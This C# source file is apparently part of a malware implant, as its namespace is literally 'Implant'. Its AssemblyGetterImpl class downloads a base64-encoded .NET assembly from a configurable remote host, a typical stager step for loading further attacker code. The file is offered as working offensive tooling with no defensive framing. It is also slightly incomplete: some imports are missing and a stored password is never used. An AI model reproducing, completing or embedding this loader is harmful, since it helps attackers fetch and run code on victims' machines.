using System;
using System.Net;

namespace Implant
{
	public class AssemblyGetterImpl: AssemblyGetterInterface
	{
        static readonly HttpClient client = new HttpClient();
        public string Host { get; set; }
        public string Password { get; set; }

        public AssemblyGetterImpl(string _host, string _password)
		{
            this.Host = _host;
            this.Password = _password;
		}

        public async Task<string> GetBase64AssemblyAsync()
        {
            try
            {
                using HttpResponseMessage response = await client.GetAsync(this.Host);
                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();
                return responseBody;
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine("\nException Caught!");
                Console.WriteLine("Message :{0} ", e.Message);
            }
            return "";
        }
    }
}

